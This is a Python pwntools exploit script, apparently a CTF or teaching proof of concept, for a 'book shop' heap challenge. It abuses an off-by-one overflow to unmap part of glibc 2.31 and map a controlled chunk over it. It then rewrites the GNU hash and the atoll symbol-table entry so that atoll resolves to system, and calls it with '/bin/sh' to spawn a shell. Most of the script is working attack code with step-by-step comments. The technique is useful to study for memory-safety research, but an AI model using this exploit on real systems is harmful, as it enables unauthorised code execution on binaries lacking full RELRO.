'''
Mmap LEAKLESS Chunk Overwrites 
;tldr: Rewrite symbol table of LibC to get code execution

Notes: 
- This POC should work on all versions of libc. But, the LibC 
  specific version for this is 2.31. 
- This technique only works if no or partial RELRO is used 
  with a dynamicly linked binary. 
- Full RELRO does not do LAZY dynamic symbol resolution so the technique
  does not work with full relro enabled. 


Steps in the code: 
- Buffer overflow (vulneability) 
- Munmap LibC (.gnu.hash and .dynsym) 
- Allocate over LibC with mmap
- Rewrite string hashing and symbol table
- Pop shell 
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.31/libc-2.31.so'
env = {}

# Binary setup
elf_name = '.book_shop_leakless' 

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([ elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.31
''')
else: 
	p = remote(domain, port) 


# Create a book
def create_book(name, author, pages): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("book:", str(pages)) 
	p.sendlineafter("Title:", str(name)) 
	p.sendlineafter("Author:", str(author))
	return 

# Write a page
def write_page(book_no, page_no, content): 
	p.sendlineafter(">", "2") 
	p.sendlineafter("No:", str(book_no))
	p.sendlineafter("write:", str(page_no))
	p.sendlineafter("page:", str(content))

# Publish a book (free it) 
def publish(book_no):
	p.sendlineafter(">", "4") 
	p.sendlineafter("No:", str(book_no))

# View a book
def view(book_no, page_no): 
	p.sendlineafter(">", "3") 
	p.sendlineafter("No:", str(book_no))
	p.sendlineafter("view:", str(page_no))

	# Parse out the book and content
	p.recvuntil("of ") 
	book_name = p.recvline()
	content = p.recvuntil("Large")[:-5]
	return book_name, content


'''
Overlapping mmap chunks via buffer overflow
==========================================

Mmap Basics
===============
Extremely large chunks (greater than 128 * 1024 to start) 
are not handled in the normal ways. All of the 'books' are
going to be of very large sizes. 

Very large chunks are allocated via a straight call to 
the syscall mmap. Similarly, munmap is used for freeing. The
second bit (| 0x2) is for marking if a chunk was mmapped.
All mmap chunks are in groupings of page sizes (0x1000 in this
case). 

Size and Prev Size fields are handled slightly differently
(compared to normal chunks). 
The size is the same. However, the prev_size field is used 
as the leftover data of a given chunk from mmap (on the 
current chunk). So, when a chunk is freed, it ADDS the
prev_size and the size together in order to determine which 
memory needs to be freed. 

Additionally, Mmap chunks are NOT handled in bins. A call
to munmap is made in order to free the chunk. 

Mmap chunks grow downards in memory (in terms of WHERE a chunk gets
placed at). 

For more information mmap chunks in GLibC, read through this: 
http://tukan.farm/2016/07/27/munmap-madness/ 


Vulnerability
===============
A buffer overflow exists because of an off by 1 error in the 
source code for the page to write to. This allows for the size 
and prev_size to be overwritten of an mmap chunk, but not enough
for any pointers to be overwritten.

'''
def munmap_libc():
	print("Starting Munmapping Process")
	print("============================") 	
	'''
	Our goal is to rewrite the symbol table of a symbol in 
	LibC by munmapping a large part of LibC. How much of LibC 
	should we munmap? 


	SIZE of Munmap Chunk
	============================

	Although a LARGE amount of LibC could be munmapped
	(and overwritten) we want to alter as few of values
	as possible. 

	Here's what sections are at the beginning: 
	- .hash (HASH)
	- .gnu.hash (GNU_HASH)
	- .dynsym (DYN_SYM or dynamic symbol table) 
	- .dynstr (STRTAB or string table) 

	So, the important part we need to overwrite is the .dynsym
	(dynamic symbol table) section. By altering this, we 
	can control how a symbol is RESOLVED to WHAT! However, it is
	not as simple as just altering location. 

	Directly below the .dynsym section is the .gnu.hash section. 
	In order to get the resolving done properly, we will have 
	to create a FAKE symbol table and rewrite the .gnu.hash 
	section. 

	So, we want to ONLY want to munmap to and including .dynsym. 
	The .dynstr plays a part in the symbol resolving process 
	and CAN be faked. However, we will make it easier on ourselves
	and not munmap this section. 

	So, what's the amount to munmap in LibC? 
	The command readelf -S libc-2.31.so shows section of the 
	binary AND offsets to them. Here's the output: 

	Section Headers:
	  [Nr] Name              Type             Address           Offset
	       Size              EntSize          Flags  Link  Info  Align
	  [ 0]                   NULL             0000000000000000  00000000
	       0000000000000000  0000000000000000           0     0     0
	  [ 1] .note.gnu.propert NOTE             0000000000000350  00000350
	       0000000000000020  0000000000000000   A       0     0     8
	  [ 2] .note.gnu.build-i NOTE             0000000000000370  00000370
	       0000000000000024  0000000000000000   A       0     0     4
	  [ 3] .note.ABI-tag     NOTE             0000000000000394  00000394
	       0000000000000020  0000000000000000   A       0     0     4
	  [ 4] .hash             HASH             00000000000003b8  000003b8
	       00000000000034e8  0000000000000004   A       6     0     8
	  [ 5] .gnu.hash         GNU_HASH         00000000000038a0  000038a0
	       0000000000003ca8  0000000000000000   A       6     0     8
	  [ 6] .dynsym           DYNSYM           0000000000007548  00007548
	       000000000000dde8  0000000000000018   A       7     1     8
	  [ 7] .dynstr           STRTAB           0000000000015330  00015330
	       000000000000608b  0000000000000000   A       0     0     1
	  [ 8] .gnu.version      VERSYM           000000000001b3bc  0001b3bc
	  ......

	The offset to .dynsym finishes at 0x00015330. So, we will
	try ONLY munmapping 0x15000 into LibC to alter the .dynsym 
	section. 
	(Could have done 0x16000 but 0x15000 munmapped less data
	and still worked. So, I went with this) 
	'''
	# Size of the chunks that are being used here
	size = 0x21000
	size_to_libc = 0x2000
	
	libc_to_overwrite = 0x15000 # Munmap .gnu.hash, .dynsym

	print("Allocating TWO books of 32 pages") 	
	# Creates two books
	create_book("A" * 8, "B" * 8, 32)
	create_book("C" * 8, "D" * 8, 32) 

	'''
	Heap Setup
	============
	chunk1 (0x21000) 
	chunk0 (0x21000) 
	LibC
	============

	We are going to OVERFLOW chunk0 with an edit
	from chunk1 in order to edit the size and prev_size 
	of chunk0. 

	This is done by overriding the chunk size
	of the index 0 chunk to include the first 0x15000
	bytes of LibC. 

	So, when this is freed, part of LibC is 
	munmapped.

	Why the hell would we want to do this? 
	The first part of LibC has MANY important aspects
	that are interesting to overwrite! Most importantly: 
	it has the dynamic symbol resolving! 

	By setting up the symbol resolving properly, we can 
	trick LibC to load an improper function for us. 
	The best part: these symbol tables are relative offsets!
	This means that if we rewrite everything properly, 
	we can do this in a LEAKLESS fashion!

	LEAKLESS! What is this, the year 2000? 

	'''

	# Overflow on chunk0. Edit prev_size and size
	fake_chunk = "I" * 0x20 # Filler
	fake_chunk += p64(0x0)  # Prev Size 
	fake_chunk += p64(size + size_to_libc + libc_to_overwrite | 2)  # Size 

	print("Edit index 0's chunk size to overlap with LibC") 
	write_page(1, 32, fake_chunk)

	print "Munmap chunk 0 with first 15 pages of LibC! :)"
	publish(0) # Remove chunk 0 and part of LibC

	'''
	There is a value called the 'mmap_threshold'. 
	This value is set to the size of the LARGEST freed 
	mmap chunk (even the overwritten size). If the allocation 
	is 'smaller' than this value, then a regular allocation 
	strategy is used. 

	In order to get another MMAP chunk to overlap with LibC
	we need to make room below the chunk we just freed. Requesting
	a chunk that would overlap with Libc and be small enough 
	to be prior to chunk 0 would be too small. 
	
	So, in order to combat this, we just free chunk1 and chunk0.
	so that we can make a VERY large allocation to 
	overlap with the current section.

	'''

	print "Munmap chunk 1\n" 
	publish(1) # Remove chunk1 

	# Return the size of the chunk allocated
	return size + size_to_libc + libc_to_overwrite


def allocate_over_libc(size): 
	print("Starting Overlapping of LibC") 
	print("============================") 
	'''
	With part of LibC munmapped, we need to
	allocate over the top of it with our own controllable
	mmap chunk. 

	This will allow us to control the symbol resolving
	process in order to set a not yet resolved symbol 
	to an arbitrary location inside of or passed 
	LibC. 

	Need to ensure that an mmap chunk is used. So
	we allocate LARGER (equal to will result in a regular
	chunk being used) than the largest size 'freed'. 

	NOTE: In a previous step, we freed both chunk 0
	AND chunk 1 to make sure we could fit in the 
	spot next to LibC. 
	'''
	# Add 0x1000 in order to pass mmap_threshold check 
	size += 0x1000

	print("Create chunk of size: ", hex(size))	
	print("Overlap with 0x15000 bytes of original LibC\n") 
	create_book("Chronicles of Munmap", "Ernest Hemmingway", size/0x1000) 

'''
Given an offset, write to the proper spot in LibC. 
Notes: 
- Assuming write is in book 2
- Could have a wrapping problem because of the page_offset
	- Could be trivially fixed to check for this 
- Will overwrite ALL values in its way on the page
	- Keep this in mind if pages are on the same location

Parameters: 
- offset: bytes from libc base 
- value: Either a single integer or a list of integers to write

Returns: 
- page_index: The index used for calculations
- byte_offset: The amount of bytes onto the page written to 
'''
def write_to_page_given_offset(offset, value): 

	# Amount of 'pages' to the beginning of LibC
	distance_to_libc_beg = 0x25 - 1

	# Page 'offset' (-0x20). So, we ADD 0x20 to get page aligned
	offset_per_page = 0x20 

       	# Calculate page and byte offset to write to
        page_index = (offset // 0x1000) + distance_to_libc_beg # Page index
        byte_offset = (offset % 0x1000) + offset_per_page # Byte offset on index

        # Write filler with NULLbytes for safety purposes
        page_content = p8(0x0) * byte_offset # Filler
	if(type(value) != list):
        	page_content += p64(value) 
	else: 
		# Iterate over a list of values to write
		for elt in value: 
			page_content += p64(elt)

	# Write to the page!
        write_page(2, page_index, page_content)

	return page_index, byte_offset	
	

def rewrite_libc(): 
	print("Start rewriting of symbol resolving process") 
	print("===========================================") 
	'''
	Attack Details and Plan 
	=============================

	The process we are targetting is the LAZY dynamic symbol
	table processing. With full RELRO or static turned on, 
	this attack no longer works because the symbol resolving
	either does not happen (static) or is done at linkage time
	(Full RELRO). The symbol resolution process is actually 
	VERY complicated.It uses all sorts of hashing, bloom 
	filters and so on. 

	This means (unless you want another research project) 
	it is likely not a good idea to reverse the entire process
	and understand WHERE to write things. 

	So, instead, it is reccomended that two things are done instead: 
	-  Copy two sections of LibC (.dynsym and .gnu.hash) and 
	   only replace what you need. 
	-  Only SET what you need, which requires knowing what the 
	   important values are. 

	With the first option, only the symbol table entry for 
	the newly called function NEEDS to be overwritten. In particular, 
	the 'relative' offset into LibC is the only thing. 

	However, the copying of this is sort of trivial to do 
	(seeing offsets for symbols in a binary can be seen with 
	readelf) and requires an ABSURD amount of writes. 
	So, we are going to rewrite ONLY the necessary valeus
	NEEDED for the symbol resolution process.
	
	In this attack, there is a function within the 'view_page' 
	function that we are targetting: 'atoll'. Because this function
	accepts a string AND has not been called before, it makes a great 
	target for the attack. WE will rewrite the symbol resolving 
	for THIS function. 

	Finding Values
	============================
	To get ALL of the proper data (for this section), we are
	going to 'dynamically' debug this (this has a very nice debug
	version with NO optimizations on the dl-lookup.c file 
	with source code in GDB to make life easier). Anytime there 
	is a value that is MISSING (causing an if statement to be reached) 
	then do the following: 
	- find the offset from libc_base
	- find the value 
	- write the value to the proper location

	In order to perform this dynamic debugging, it is reccomended
	that a munmapped LibC (that we can write to) and regular (not 
	corrupted) one are being stepped through, side by side, 
	to see what values are missing. After doing this for a while,
	you'll replace ALL of the necessary values for the symbol 
	resolution process :) 

	To hit the proper debugging location, right before you are
	going to resolve the symbol, set a breakpoint on 'do_lookup_x'.
	'''

	'''
	Allocates 0x3a000 mmap chunk, which overlaps LibC by 0x15000. 
	So, (0x3a000-0x15000)/0x1000 = 0x25 (37) is the page number
	that represents the VERY beginning of LibC. Of course, this is 0
	indexed so it is actually page 36. 

	Additionally, the pages are written at a small offset
	(page - 0x20). So, the actual beginning is page 0x36 + 0x20 bytes. 

	This write is NOT needed, but is a great reference point. 
	'''
	distance_to_libc_beg = 0x25 - 1
	offset_per_page = 0x20
	write_page(2, distance_to_libc_beg, offset_per_page * "C" + "Beg of LibC!") 

	'''

	WHERE we need to write
	==========================

	From this point on, we are going to write the necessary 
	things in order to get the symbol to resolve properly :) 
	In a nut shell, these are the following items we need to set: 
	- gnu_bitmask for this entry (2 values at different offsets) 
	- gnu_bucket for this entry 
	- gnu_chain_zero  (2 values) 
	- atoll symbol table to be system 

	How to Write In Challenge 
	===========================

	For writing to the proper location, we will calculate the right
	*page* by taking the byte offset (from LibC base) / 0x1000. 
	
	From there, to get the proper byte offset (now that we are on 
	the right page) we will take the remainder of the division 
	of LibC_Base / 0x1000 (which is perfect for the byte offset) 
	and add the page offset (from the user perspective). 
	In order to make this writing easier, I have created a function 
	called 'write_to_page_given_offset' to do the dirty work. 

	If all of this we done write, we should be able to write to
	the proper location! 
	'''

	'''
	To start with, we'll do gnu_bitmask. The location, where this
	is needed, is here: 
	https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-lookup.c#L412
	'''

	###############
	# GNU BitMask #
	############### 

	# Calculate page and byte offset to write to
	gnu_bitmask_offset = 0x38b0 # Bytes from LibC base to address loc
	gnu_bitmask_value = 0x010220a044103000 # Value needed
	page, offset = write_to_page_given_offset(gnu_bitmask_offset, gnu_bitmask_value)
	print "Gnu BitMask Index: ", hex(page) 
	print "Gnu Byte Offset: ", hex(offset) 
	print "Gnu Bit Mask Value: ", hex(gnu_bitmask_value) 

	##############
	# Bitmask II #
	##############
	'''
	Location: 
	https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-lookup.c#L415
	'''
	gnu_bitmask_offset = 0x3a20 # bytes from LibC base to address
	gnu_bitmask_value = 0x2040800420684082 # Value
	page, offset = write_to_page_given_offset(gnu_bitmask_offset, gnu_bitmask_value)	
	print "Gnu BitMask II Index: ", hex(page) 
	print "Gnu Byte II Offset: ", hex(offset) 
	print "Gnu Bit Mask II Value: ", hex(gnu_bitmask_value) 

	##############
	# Gnu Bucket #
	############## 
	'''
	For the Gnu Bucket, this actually calculates some values
	then accessing the bucket as an array. However, in order 
	to make life easier, we will just calculate the ACTUAL
	location (after the indexing) of the bucket value. 

	This location is at 
	https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-lookup.c#L426
	'''
	gnu_bucket_offset = 0x4e68
	gnu_bucket_value = 0x7fe
	page, offset = write_to_page_given_offset(gnu_bucket_offset, gnu_bucket_value) 
	print "Gnu Bucket Index: ", hex(page) 
	print "Gnu Bucket Byte Offset: ", hex(offset) 
	print "Gnu Bucket Value: ", hex(gnu_bitmask_value) 


	'''
	Gnu Chain Zero value. The reason for this can be found: 
	https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-lookup.c#L430

	For this value, we iterate through an argument called 'hasharr'. 
	So, the goal is to set this value in order to make the
	make xor'ed with the hash = 0. 

	In theory, we COULD just set the first value to 'new_hash' and
	it would be zero. However, for the sake of simplicity, 
	we will write ALL necessary values that it iterates through here.
	'''
	gnu_chain_zero_offset = 0x7044
	gnu_chain_zero_value = 0x24b529fa0d358048 # Index 0 and 1
	gnu_chain_zero_value_2 = 0x0f1bcb81cd4fd38c # Index 2 and 3

	page, offset = write_to_page_given_offset(gnu_chain_zero_offset, [gnu_chain_zero_value, gnu_chain_zero_value_2])

	print "Gnu Chain Zero Index: ", hex(page) 
	print "Gnu Chain Zero Offset: ", hex(offset) 
	print "Gnu Chain Zero Value1: ", hex(gnu_bitmask_value) 
	print "Gnu Cahin Zero Value2: ", hex(gnu_chain_zero_value_2) 

	'''
	Time for the fun part; rewritting the symbol table for atoll :) 
	Each 'symbol' is built the following way in an ELF file: 

	typedef struct {
		Elf64_Word      st_name;
		unsigned char   st_info;
		unsigned char   st_other;
		Elf64_Half      st_shndx;
		Elf64_Addr      st_value;
		Elf64_Xword     st_size;
	} Elf64_Sym;

	The only field that really matter (to us) 
	is 'st_value'! This allows us to have a 
	relative offset to 'system', which pops a shell for 
	us :) 
	'''
	sym_tab_loc = 0x13560 
	sym_tab_1 = 0x00100012000035c4 # Symbol table info
	sym_tab_2 = 0x00000000000459e7 # Offset to system!
	sym_tab_3 = 0x000000000000001c  # size
	write_to_page_given_offset(sym_tab_loc, [sym_tab_1, sym_tab_2, sym_tab_3])

	print("Writing Symbol Table entry for atoll") 
	print("Write atoll offset to point to system\n") 


# Calls the function that we set the symbol table for (atoll) 
def win(): 
	print("Start Shell Popping")
	print("=====================") 
	
	p.sendlineafter(">", "3") # View page
	p.sendline("2")  # Book 2

	'''
	atoll would normally convert the integer (string in a 
	tmp buffer) into a number here. 

	When atoll is called, because it has NOT been called yet,
	it will try to resolve the symbol. Because the resolving
	process has been compromised, instead of resolving to 
	atoll this will resolve to system!

	Passing in /bin/sh will then pop a shell for us :)
	
	'''
	print("Call atoll, which will resolve to system!") 
	p.sendline("/bin/sh") 
	
print "Starting Mmap Chunk Overlapping....LEAKLESS!"
print "============================================"
size = munmap_libc()

allocate_over_libc(size) 
rewrite_libc() 
win()

p.interactive()


